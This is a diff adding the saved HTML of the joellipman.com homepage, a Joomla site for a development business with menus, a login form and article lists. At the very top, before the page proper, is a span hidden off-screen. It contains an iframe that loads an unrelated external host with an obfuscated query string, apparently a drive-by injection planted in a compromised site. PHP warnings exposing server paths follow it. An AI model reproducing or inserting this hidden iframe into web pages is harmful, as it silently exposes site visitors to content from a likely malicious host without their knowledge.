@@ -1,0 +1,1264 @@
+<span style="position:absolute; top:-1068px; width:317px; height:317px;">
+<iframe src="http://miejskahelotages.victorylifestyle.net/?xHiMdbKaLxbNC4A=l3SKfPrfJxzFGMSUb-nJDa9BNUXCRQLPh4SGhKrXCJ-ofSih17OIFxzsmTu2KTKvgJQyfu0SaGyj1BKeO10hjoUeWF8Z5e3x1RSL2x3fipSA9weINw1AqZuSR7Q_iw6gzOJAI8gkxRPW7mNVyOsZUl0U4xgY0Q" width="255" height="255"></iframe>
+</span>
+<noscript><br />
+<b>Warning</b>:  session_start() [<a href='function.session-start'>function.session-start</a>]: Cannot send session cookie - headers already sent by (output started at /home1/jbuzzer/public_html/joellipman_com/live/includes/defines.php:123) in <b>/home1/jbuzzer/public_html/joellipman_com/live/libraries/joomla/session/session.php</b> on line <b>671</b><br />
+<br />
+<b>Warning</b>:  session_start() [<a href='function.session-start'>function.session-start</a>]: Cannot send session cache limiter - headers already sent (output started at /home1/jbuzzer/public_html/joellipman_com/live/includes/defines.php:123) in <b>/home1/jbuzzer/public_html/joellipman_com/live/libraries/joomla/session/session.php</b> on line <b>671</b><br />
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#" xmlns="http://www.w3.org/1999/xhtml" xml:lang="langen-gb" lang="langen-gb" dir="ltr">
+<head>
+	<meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <meta name="alexaVerifyID" content="mbYp0_1Td4Slk5ywp-Ts_7_qzdA" />
+    <meta name="google-site-verification" content="vRDsuz5XUUog_rcEuufJ_bZ8uRiGTIqsmZwS3wvaiSg" />
+  <!-- The following appends the site name to every page title except my Homepage (called Home) -->
+
+<script type="application/ld+json">
+{
+"@context": "http://schema.org",
+"@type": "WebSite",
+"url": "http://www.joellipman.com/",
+"potentialAction": {
+"@type": "SearchAction",
+"target": "http://www.joellipman.com/search.html?searchword={search_term_string}",
+"query-input": "required name=search_term_string"
+}
+}
+</script>
+
+
+ 	  <base href="http://joellipman.com/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="keywords" content="Joel,Lipman,Joel Lipman,Software,Website,Automation, Design, Bournemouth, Development, Joe, Dorset, Joomla, Quadcopter, Android, iOS, SSIS, SSRS" />
+  <meta name="rights" content="©2015 Joel Lipman Ltd. All rights reserved" />
+  <meta name="description" content="Joel Lipman Ltd is a web and mobile application development company.  Used as a repository and notes for all types of IT development.  The focus is to improve the use of technology in conventional industries such as farming and government administration." />
+  <meta name="generator" content="Joomla! - Open Source Content Management" />
+  <title>Joel Lipman .Com</title>
+  <link href="/rss.html" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/atom.html" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/templates/wunderkind/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" href="/plugins/system/iceshortcodes/assets/iceshortcodes.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_k2/css/k2.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/bootstrap.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/style.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/font-awesome.min.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/ionicons.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/ionicons.min.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/liquid-slider.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/animate.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/magnific-popup.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/YTPlayer.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/flexslider.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/cubeportfolio.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/fonts/raleway/stylesheet.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/fonts/montserrat/stylesheet.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/wunderkind/css/custom.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_sp_portfolio/assets/css/mod_sp_portfolio_default.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_sp_portfolio/assets/css/slimbox2.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_news_show_sp2/assets/css/mod_news_show_sp2.css" type="text/css" />
+  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
+  <script src="/media/system/js/core.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-noconflict.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-migrate.min.js" type="text/javascript"></script>
+  <script src="/components/com_k2/js/k2.js?v2.6.9&amp;sitepath=/" type="text/javascript"></script>
+  <script src="/media/system/js/caption.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/bootstrap.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.liquid-slider.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.stellar.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.sticky.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/waypoints.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/wow.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.counterup.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.fitvids.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/modernizr.custom.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/toucheffects.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.easing.1.3.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.touchSwipe.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.cubeportfolio.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.flexslider-min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/jquery.backstretch.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/gmap3.min.js" type="text/javascript"></script>
+  <script src="/templates/wunderkind/js/scripts.js" type="text/javascript"></script>
+  <script src="/modules/mod_responsive_contact_form/js/jqBootstrapValidation.min.js" type="text/javascript"></script>
+  <script src="/modules/mod_sp_portfolio/assets/js/jquery.isotope.min.js" type="text/javascript"></script>
+  <script src="/modules/mod_sp_portfolio/assets/js/slimbox2.js" type="text/javascript"></script>
+  <script src="/media/system/js/mootools-more.js" type="text/javascript"></script>
+  <script src="/modules/mod_news_show_sp2/assets/js/nssp2.js" type="text/javascript"></script>
+  <script src="/media/jui/js/bootstrap.min.js" type="text/javascript"></script>
+  <script src="/modules/mod_pr_slider/js/jquery.ytplayer.js" type="text/javascript"></script>
+  <script type="text/javascript">
+jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});
+$(function () { $("input,select,textarea").not("[type=submit]").jqBootstrapValidation(); } );
+window.setInterval(function(){var r;try{r=window.XMLHttpRequest?new XMLHttpRequest():new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}if(r){r.open("GET","./",true);r.send(null)}},1740000);
+jQuery(document).ready(function(){
+	jQuery('.hasTooltip').tooltip({"html": true,"container": "body"});
+});
+  </script>
+
+	<link href='http://www.google.com/fonts#UsePlace:use/Collection:Montserrat:400,700' rel='stylesheet' type='text/css' />
+	<link href='http://www.google.com/fonts#UsePlace:use/Collection:Raleway:400,700,300,100' rel='stylesheet' type='text/css' />
+
+	<link rel="stylesheet" href="/templates/wunderkind/css/colors/red.css" type="text/css"/>
+
+	<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>
+	
+
+</head>
+
+<body style="background:#fefefe">
+						<div id="preloader">
+            <div class="preloader-container">
+				                <h4 class="preload-logo wow fadeInLeft">Welcome to Joel Lipman .com</h4>
+                								<h4 class="back-logo wow fadeInRight">Preparing Content...</h4>
+								                <img src="/images/preload.gif" class="preload-gif wow fadeInUp">
+				            </div>
+        </div>
+		
+							<div class="moduletable">
+						
+
+<section id="home-pattern" class="full-height" data-stellar-background-ratio="0.5" data-stellar-vertical-offset="" style="background: url('/images/design_2015/backgrounds/slide-2.jpg')">
+        	<div class="parallax-overlay"></div>
+ <a id="video" class="player mb_YTVPlayer isMuted" data-property="{videoURL:'https://www.youtube.com/watch?v=UW08aMIYomQ',containment:'#home-pattern', showControls:true, autoPlay:true, loop:true, mute:true, startAt:0, opacity:1, addRaster:false, quality:'default'}" title="Google interns' first week" style="display: none; position: relative; background-image: none;"></a>			
+			<div class="home-container text-center">
+            	<div class="home-title liquid-slider" id="slider-home" style="z-index:3;">
+                	                	<div>
+					<h1><small class="white">Welcome to<br /><b>Joel Lipman</b> .com</small> </h1><p class="lead">Helping Web-developers since 1999</p>
+</h1>
+<div class="home-btn">
+<h4 class="btn-home"><a href="#about">HERE FOR YOU</a></h4>
+</div>                    </div>
+										
+										<div>
+					<h1><small class="white">Our new app for iOS and AndroidOS</small> <br /><strong>Quadcopter Map</strong></h1>
+<p class="lead">Designed to help toy flyers fly responsibly!</p>
+<div class="home-btn">
+<h4 class="btn-home"><a href="#services">WHAT WE DO</a></h4>
+</div>                    </div>
+										
+										<div>
+					<h1><small class="white">The Tag Cloud for Joomla!</small> <br /><strong>Joes Word Cloud</strong></h1><p class="lead">A website addon to automatically generate content</p><div class="home-btn">
+<h4 class="btn-home"><a href="#work">GO TO DOWNLOADS</a></h4>
+</div>                    </div>
+										
+										<div>
+					<h1><small class="white">Award Winner 2011</small> <br /><strong>Best Tool for Webmasters</strong></h1>
+<p class="lead">Let's meet up and see if there's chemistry!</p>
+<div class="home-btn">
+<h4 class="btn-home"><a href="#contact">CONTACT US</a></h4>
+</div>                    </div>
+										
+										
+										
+					                    
+            	</div>
+            </div>	
+		 
+</section>
+		      
+  
+                   	
+	
+	
+	
+<script>
+jQuery(".home-fullscreen-slider").backstretch([
+		"/images/design_2015/backgrounds/slide-2.jpg",
+			"/images/design_2015/backgrounds/slide-3.jpg",
+			"/images/design_2015/backgrounds/slide-1.jpg",
+			], {
+	fade: 750,
+		duration: 10000	});
+
+
+
+   jQuery(function(){
+	jQuery(".player").mb_YTPlayer();
+});
+</script>
+						
+	
+			</div>
+	
+			<div class="home-bottom">
+            	<div class="container text-center">
+                    <div class="move">
+                        <a href="#about" class="fa fa-chevron-down"></a>
+                        <div class="dots"></div>
+                    </div>
+            	</div>
+            </div>
+		
+
+
+	<!-- Body -->
+
+
+			<!-- Header -->
+
+				
+		<section id="fixed-navbar" class="">
+			<nav class="navbar navbar-default navbar-static-top" role="navigation">
+				<div class="container">
+					<div class="row">
+					<!-- Brand and toggle get grouped for better mobile display -->
+					<div class="navbar-header">
+						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-nav">
+						<span class="sr-only">Toggle navigation</span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+						<span class="icon-bar"></span>
+					    </button>
+                        <a class="navbar-brand" href="/" title="joellipman.com">
+						<div class="brand pull-left">
+						<img src="http://joellipman.com/images/design_2015/logos/logo_2015_montserrat.png" alt="Joel Lipman .Com" /> 						</div>
+
+						</a>
+					</div>
+
+					<!-- Collect the nav links, forms, and other content for toggling -->
+                    <div class="collapse navbar-collapse" id="main-nav">
+                        		<div class="moduletable_menu">
+						
+<ul class="nav navbar-nav  navbar-right"><li class="item-101"><a href="/" >Home</a></li><li class="item-108"><a href="#about" >Welcome</a></li><li class="item-272 dropdown"><a href="#account" >Account<b class="caret"></b></a><ul class="dropdown-menu"><li class="item-203"><a href="/account/registration.html" >Join Us!</a></li><li class="item-204"><a href="/password-reset/forgot-password.html" >Password Reset</a></li><li class="item-206"><a href="/member-access/login.html" >Member Access</a></li></ul></li><li class="item-183 dropdown"><a href="#articles" >Articles<b class="caret"></b></a><ul class="dropdown-menu"><li class="item-270"><a href="/articles/apple.html" >Apple</a></li><li class="item-117"><a href="/articles/automation.html" >Automation</a></li><li class="item-210"><a href="/articles/google.html" >Google</a></li><li class="item-230"><a href="/articles/graphic-design.html" >Graphic Design</a></li><li class="item-214"><a href="/articles/linux.html" >Linux</a></li><li class="item-215"><a href="/articles/microsoft.html" >Microsoft</a></li><li class="item-232"><a href="/articles/sql.html" >SQL</a></li><li class="item-222"><a href="/articles/web-development.html" >Web-Development</a></li></ul></li><li class="item-109 dropdown"><a href="#services" >Services<b class="caret"></b></a><ul class="dropdown-menu"><li class="item-236"><a href="/services/documentation.html" >Documentation</a></li><li class="item-237"><a href="/video-how-tos/documentation/video-tutorials.html" >Video How-Tos</a></li><li class="item-309"><a href="/services/password-analyzer.html?view=page" >Password Analyzer</a></li></ul></li><li class="item-110 dropdown"><a href="#our-work" >Work<b class="caret"></b></a><ul class="dropdown-menu"><li class="item-292"><a href="/work/downloads.html" >Downloads</a></li><li class="item-238"><a href="/helpful-links/helpful-links.html" >Helpful Links</a></li></ul></li><li class="item-113"><a href="#contacts" >Contact</a></li></ul>
+</div>
+		</div>
+	
+                    </div><!-- /.navbar-collapse -->
+					
+					</div><!-- /.container -->
+				</div><!-- /.container -->
+			</nav>
+		</section>
+			
+
+
+		<div class="site-wrapper">
+				 <section id="about">
+                <div class="container content">
+							<div class="moduletable">
+						
+
+<div class="custom"  >
+	 <div class="col-lg-12 section-title-about wow flipInX">
+                        <h2><small>Hi there!</small><br /><small>Welcome to </small>Joel Lipman <small>.com!</small></h2>
+                        <p class="lead">We specialise in building mobile applications for <span class="highlight">iOS & AndroidOS</span> and website systems for <span class="highlight">Joomla & Wordpress</span>. <br /> <b>Thanks for visiting!</b>  We hope we have been, as always, of some use to you.</p>
+                    </div>
+                    <div class="row wow flipInX">
+                        <div class="col-md-6 col-sm-6">
+                            <div class="about-row">
+                                <div class="about-icon">
+                                    <i class="icon ion-ios-lightbulb-outline ion-3x highlight"></i>
+                                    <i class="icon ion-ios-lightbulb-outline back-icon"></i>
+                                </div>
+                                <div class="about-info">
+                                	<h4>We're Innovative<br><small>Searching for what hasn't been done</small></h4>
+                                    <p class="about-description">We encounter a problem; we search for a solution; we don't find one; we publish how we solved it.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-sm-6">
+                            <div class="about-row">
+                                <div class="about-icon">
+                                    <i class="icon ion-paper-airplane ion-3x highlight"></i>
+                                    <i class="icon ion-paper-airplane back-icon"></i>
+                                </div>
+                                <div class="about-info">
+                                  <h4>We're High-Flyers<br><small>Taking to the skies</small></h4>
+                                    <p class="about-description">We help toy flyers fly responsibly!  Our apps keep users up-to-date with worldwide flight regulations.  Automation and aerial photography are our hobbies as well.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>   
+                    <div class="row wow flipInX">
+                        <div class="col-md-6 col-sm-6">
+                            <div class="about-row">
+                                <div class="about-icon">
+                                    <i class="icon ion-ios-heart ion-3x highlight"></i>
+                                    <i class="icon ion-ios-heart back-icon"></i>
+                                </div>
+                                <div class="about-info">
+                                  <h4>We're Passionate<br><small>The gist is we enjoy coding</small></h4>
+                                	<p class="about-description">Programming commercially since 1999, we have seen systems come and go.  We like to change, improve and customize existing systems specific to the client. </p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-sm-6">
+                            <div class="about-row">
+                                <div class="about-icon">
+                                    <i class="icon ion-speakerphone ion-3x highlight"></i>
+                                    <i class="icon ion-speakerphone back-icon"></i>
+                                </div>
+                                <div class="about-info">
+                                  <h4>We're Growing<br><small>It's FREE to be a member</small></h4>
+                                    <p class="about-description">Over 10'000 members contribute to our community databases and opensource developments, and all we ask is for everyone to treat each other professionally.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+		</div>
+	
+                </div>
+        </section>
+		
+					 <section id="who-we-are" data-stellar-background-ratio="0.6" data-stellar-vertical-offset="">
+                <div class="row" style="position:relative;">
+                	<div class="parallax-overlay"></div>
+                    <div class="container">
+						<div class="col-md-6 col-we-are wow flipInX">
+									<div class="moduletable">
+						
+
+<div class="custom"  >
+	<h2 class="we-are-info">Our Skills<br><small class="highlight">Business Intelligence</small></h2>          
+                            <br>
+                            <p class="p-info">As information management specialists, our background stems from the scripting or automating of data migrations to upgraded systems.  Most of our experience lies in auditing information and report building.</p> 
+                            <p class="p-info">We like to think of ourselves as web-developers but then like to get involved with anything related to computers.  We strive to solve computer-related issues that the rest of the crowd so easily give up on.</p>  
+                        </div>
+		</div>
+	
+						</div>
+						<div class="col-md-6 col-md-skills wow flipInX">
+									<div class="moduletable">
+						 
+
+
+
+
+
+<div class="skills-col">
+		        				
+				
+                				<p><em>Website Support</em></p>
+                                <div class="skillbar">
+                                    <div class="skillbar-title"><span>97%</span></div>
+                                    <div class="skillbar-bar" style="width: 97%; background-color:#D40436"></div>
+                                </div>
+				
+								<p><em>Mobile Design </em></p>
+                                <div class="skillbar">
+                                    <div class="skillbar-title"><span>74%</span></div>
+                                    <div class="skillbar-bar" style="width: 74%; background-color:#D40436"></div>
+                                </div>
+								
+								<p><em>Data Automation</em></p>
+                                <div class="skillbar">
+                                    <div class="skillbar-title"><span>89%</span></div>
+                                    <div class="skillbar-bar" style="width: 89%; background-color:#D40436"></div>
+                                </div>
+								
+								<p><em>Database Management</em></p>
+                                <div class="skillbar">
+                                    <div class="skillbar-title"><span>65%</span></div>
+                                    <div class="skillbar-bar" style="width: 65%; background-color:#D40436"></div>
+                                </div>
+								
+								
+								
+								
+								
+								
+					
+		</div>
+				
+	            				</div>
+	
+						</div>
+					</div>
+                </div>
+            </section>
+		
+
+
+
+
+			
+
+
+						
+          			<section id="account" data-stellar-background-ratio="0.6" data-stellar-vertical-offset="">
+            	<!-- <div class="container"> //-->
+							<div class="moduletable">
+						
+
+<div class="custom"  >
+	                    <div class="col-lg-12 section-title wow flipInX jdl_red_bg" style="color: #fff;background-color: #D40436;">
+                        <br /><h2><small style="color:#fff">To Our Members</small><br><strong style="color:#fff">Thank you!</strong></h2>
+                        <p class="lead" style="color:#fff">For all those around the world that have been patient enough<br />to test our products and take the time to comment &amp; suggest: <span class="highlight" style="color:#fff;font-weight:400">Thank you again :c)</span></p></div>
+		</div>
+			<div class="moduletable">
+						<form action="http://joellipman.com/" method="post" id="login-form" class="form-inline" style="color:#fff;background-color:#D80018;padding-bottom:10px;">
+		<div class="userdata" style="text-align:center;margin-bottom:10px;">
+		<div id="form-login-username" class="control-group">
+			<div class="controls">
+									<div class="input-prepend">
+						<span class="add-on">
+							<span class="icon-user hasTooltip" title="Username"></span>
+							<label for="modlgn-username" class="element-invisible" style="width:100px;">Username</label>
+						</span>
+						<input id="modlgn-username" type="text" name="username" class="input-small" tabindex="0" size="18" placeholder="Username" style="font-weight:400;width:200px;background-color:#fff;color:#D80018;border:5px solid #fff;padding:2px 5px;margin:2px 0; -moz-border-radius: 5px; -webkit-border-radius: 5px;" />
+					</div>
+							</div>
+		</div>
+		<div id="form-login-password" class="control-group">
+			<div class="controls">
+									<div class="input-prepend">
+						<span class="add-on">
+							<span class="icon-lock hasTooltip" title="Password">
+							</span>
+								<label for="modlgn-passwd" class="element-invisible" style="width:100px;">Password							</label>
+						</span>
+						<input id="modlgn-passwd" type="password" name="password" class="input-small" tabindex="0" size="18" placeholder="Password" style="font-weight:400;width:200px;background-color:#fff;color:#D80018;;border:5px solid #fff;padding:2px 5px;margin:2px 0; -moz-border-radius: 5px; -webkit-border-radius: 5px;" />
+					</div>
+							</div>
+		</div>
+						<div id="form-login-remember" class="control-group checkbox">
+			<label for="modlgn-remember" class="control-label">Remember Me</label> <input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/>
+		</div>
+				<div id="form-login-submit" class="control-group" style="margin-top:10px;">
+			<div class="controls">
+				<button type="submit" tabindex="0" name="Submit" class="btn btn-primary" style="border:2px solid #000;font-size: 16px;font-weight: 400;font-family: 'Montserrat', sans-serif;    margin: 20px;">Log in</button>
+			</div>
+		</div>
+
+		</div>
+					<!-- <ul class="unstyled" style="text-align:center;list-style-type:none;width:250px;"> //-->
+							<!-- <li style="background-color:#fff;margin:1px;"> //-->
+					<div style="margin:0 auto; text-align:center">
+						<h4 class="btn-home" style="margin:0">
+							<a href="/account/registration.html" style="font-size:9pt;">
+							Create an account</a>
+						</h4>
+				<!-- </li> //-->
+									<h4 class="btn-home" style="margin:0">
+					<a href="/your-profile/forgot-username.html" style="font-size:9pt;">
+					Forgot your username?</a>
+						</h4>
+						<h4 class="btn-home" style="margin:0">
+					<a href="/password-reset/forgot-password.html" style="font-size:9pt;">
+					Forgot your password?</a>
+						</h4>
+					</div>
+			<!-- </ul> //-->
+		<input type="hidden" name="option" value="com_users" />
+		<input type="hidden" name="task" value="user.login" />
+		<input type="hidden" name="return" value="aHR0cDovL2pvZWxsaXBtYW4uY29tLw==" />
+		<input type="hidden" name="32fc45431c22cee141e3e8943dda4f32" value="1" />	</div>
+	</form>
+		</div>
+	<div>
+<div class="col-md-4 col-sm-6 wow flipInX animated"><div style="text-align:center;margin-top:60px;"><span class="highlight" style="font-size: 70px;font-family: 'Montserrat', sans-serif;font-weight: 700;line-height: 0px;color:#D80018;">10k</span><p class="lead">Members</p><div style="padding:10px;border-radius: 10px 10px 10px 10px;-moz-border-radius: 10px 10px 10px 10px;-webkit-border-radius: 10px 10px 10px 10px;border: 15px solid #D80018;-webkit-box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;-moz-box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;margin-bottom:20px;"><table style="text-align:left;color: #D80018;"><tr><td colspan="4"><b>0</b> members are logged-in.<td></tr><tr><td colspan="4"><b>186</b> guests are on-line.<td></tr><tr><td colspan="4"><b>1,710</b> visitors are hesitant.<td></tr><tr><td colspan="4"><b>12,025</b> members in total.<td></tr><tr><td colspan="4" style="font-weight:700"><br />Members Activated<td></tr><tr><td></td><td><i>Before</i>&nbsp;</td><td><i>Current</i>&nbsp;</td><td><i>Trend</i>&nbsp;</td></tr><tr><td>Day&nbsp;</td><td title="yesterdays">0</td><td>0</td><td title="This time yesterday: 0"><span style="color:black;">=</span></td></tr><tr><td title="from Mondays">Week&nbsp;</td><td title="last week">3</td><td>0</td><td title="This time last week: 2"><span style="color:red;">-</span></td></tr><tr><td>Month&nbsp;</td><td title="last month">6</td><td>9</td><td title="This time last month: 6"><span style="color:green;">+</span></td></tr><tr><td>Year&nbsp;</td><td title="last year">1,034</td><td>100</td><td title="This time last year: 954"><span style="color:red;">-</span></td></tr></table></div></div></div><div class="col-md-4 col-sm-6 wow flipInX animated"><div style="text-align:center;margin-top:60px;"><span class="highlight" style="font-size: 70px;font-family: 'Montserrat', sans-serif;font-weight: 700;line-height: 0px;color:#D80018;">7557k</span><p class="lead">Reads</p><div style="padding:10px;border-radius: 10px 10px 10px 10px;-moz-border-radius: 10px 10px 10px 10px;-webkit-border-radius: 10px 10px 10px 10px;border: 15px solid #D80018;-webkit-box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;-moz-box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;margin-bottom:20px;"><table style="text-align:left;color: #D80018;"><tr><td colspan="4"><b>454</b> articles published.<td></tr><tr><td colspan="4"><b>5,515</b> edits/modifications.<td></tr><tr><td colspan="4"><b>125</b> articles being reviewed.<td></tr><tr><td colspan="4"><b>579</b> articles in total.<td></tr><tr><td colspan="4" style="font-weight:700"><br />Authoring Trends<td></tr><tr><td></td><td><i>Before</i>&nbsp;</td><td><i>Current</i>&nbsp;</td><td><i>Trend</i>&nbsp;</td></tr><tr><td>Day&nbsp;</td><td title="yesterdays">0</td><td>0</td><td title="This time yesterday: 0"><span style="color:black;">=</span></td></tr><tr><td title="from Mondays">Week&nbsp;</td><td title="last week">0</td><td>0</td><td title="This time last week: 0"><span style="color:black;">=</span></td></tr><tr><td>Month&nbsp;</td><td title="last month">2</td><td>0</td><td title="This time last month: 2"><span style="color:red;">-</span></td></tr><tr><td>Year&nbsp;</td><td title="last year">184</td><td>9</td><td title="This time last year: 181"><span style="color:red;">-</span></td></tr></table></div></div></div><div class="col-md-3 col-sm-6 wow flipInX animated"><div style="text-align:center;margin-top:60px;"><span class="highlight" style="font-size: 70px;font-family: 'Montserrat', sans-serif;font-weight: 700;line-height: 0px;color:#D80018;">1k</span><p class="lead">Comments</p><div style="padding:10px;border-radius: 10px 10px 10px 10px;-moz-border-radius: 10px 10px 10px 10px;-webkit-border-radius: 10px 10px 10px 10px;border: 15px solid #D80018;-webkit-box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;-moz-box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;box-shadow: 0px 0px 15px 0px rgba(216,1,8,0.5) inset;margin-bottom:20px;"><table style="text-align:left;color: #D80018;"><tr><td colspan="4"><b>785</b> members commenting.<td></tr><tr><td colspan="4"><b>170</b> articles commented on.<td></tr><tr><td colspan="4"><b>508</b> replies to comments.<td></tr><tr><td colspan="4"><b>998</b> votes for and against.<td></tr><tr><td colspan="4" style="font-weight:700"><br />Comments Posted<td></tr><tr><td></td><td><i>Before</i>&nbsp;</td><td><i>Current</i>&nbsp;</td><td><i>Trend</i>&nbsp;</td></tr><tr><td>Day&nbsp;</td><td title="yesterdays">0</td><td>0</td><td title="This time yesterday: 0"><span style="color:black;">=</span></td></tr><tr><td title="from Mondays">Week&nbsp;</td><td title="last week">2</td><td>0</td><td title="This time last week: 2"><span style="color:red;">-</span></td></tr><tr><td>Month&nbsp;</td><td title="last month">4</td><td>6</td><td title="This time last month: 4"><span style="color:green;">+</span></td></tr><tr><td>Year&nbsp;</td><td title="last year">184</td><td>46</td><td title="This time last year: 146"><span style="color:red;">-</span></td></tr></table></div></div></div><br style="clear:both" /></p>
+</div>
+
+				<!-- </div> //-->
+			</section>
+			
+          <!--			<section id="clients"> //-->
+            <section id="articles" data-stellar-background-ratio="0.6" data-stellar-vertical-offset="">
+
+                <div class="container">
+							<div class="moduletable">
+						
+
+<div class="custom"  >
+	                    <div class="col-lg-12 section-title wow flipInX">
+                        <br /><br /><h2><small>Our Website-Development Notes</small><br><strong>We hope this helps!</strong></h2>
+                         <p class="lead">We've been writing websites and scripts commercially since 1999 and using this website to store notes as we go along. <br />No need to sign up or generate enough points to post, if you know the answer, just post it.<br />What we learn we share for free, why? because someone else taught us for free... <span class="highlight">Thank you OpenSource! </span></p>
+<!--
+<div class="home-btn">
+<h4 class="btn-home"><a href="/articles.html">READ OUR ARTICLES</a></h4>
+</div>
+//-->
+</div></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<div class="search" style="width:350px;margin:0 auto;">
+	<form action="/search.html" method="get" class="form-inline">
+		<input name="searchword" id="mod-search-searchword" maxlength="200" class="inputbox search-query" style="height:32px;-webkit-border-radius: 3px;
+-moz-border-radius: 3px;
+border-radius: 3px;width:75%;float:left;" type="search" placeholder="Search ..."> <button class="button btn btn-primary" onclick="this.form.searchword.focus();" style="float:left">Go</button>		<input type="hidden" name="task" value="search">
+		<input type="hidden" name="option" value="com_search">
+		<input type="hidden" name="Itemid" value="117">
+		<input type="hidden" id="ordering" name="ordering" value="relevance">
+	</form>
+</div></div>
+		</div>
+			<div class="moduletable col-md-6 separator-video-content wow flipInX animated jdl_latest">
+							<h3>Recently Updated</h3>
+						<div class="items-more">
+<ul class="nav nav-tabs nav-stacked">
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/mysql/articles/sql/mysql/foreign-characters-create-symbols-in-php-and-mysql.html" itemprop="url">
+				Foreign Characters create symbols in PHP and MySQL		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/web-development/articles/web-development/php/php-issue-simplexml-load-string-parser-error-input-is-not-proper-utf-8-indicate-encoding.html" itemprop="url">
+				PHP Issue: simplexml_load_string parser error : Input is not proper UTF-8, indicate encoding !		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/mysql/articles/sql/mysql/convert-foreign-characters-to-english-alphabet.html" itemprop="url">
+				Convert foreign characters to English alphabet		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/web-development/articles/web-development/display-feeds-to-major-social-networks.html" itemprop="url">
+				Display Feeds to major Social Networks		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/articles/google/android/application-development/basic-android-app-using-google-maps-and-current-location.html" itemprop="url">
+				Basic Android App using Google Maps and Current Location		</a>
+	</li>
+</ul>
+</div>
+		</div>
+			<div class="moduletable col-md-6 separator-video-content wow flipInX animated jdl_popular">
+							<h3>Most Popular</h3>
+						<div class="items-more">
+<ul class="nav nav-tabs nav-stacked">
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/articles/web-development/joomla/3rd-party-joomla/installing-phpbb3-for-joomla-with-a-rockettheme-template.html" itemprop="url">
+				Installing phpBB3 for Joomla with a RocketTheme template		</a>
+	</li>
+	<li itemscope itemtype="http://schema.org/Article">
+		<a href="/services/documentation/joes-quicklist-weblinks-jqw.html" itemprop="url">
+				Joes Quicklist Weblinks (JQW)		</a>
+	</li>
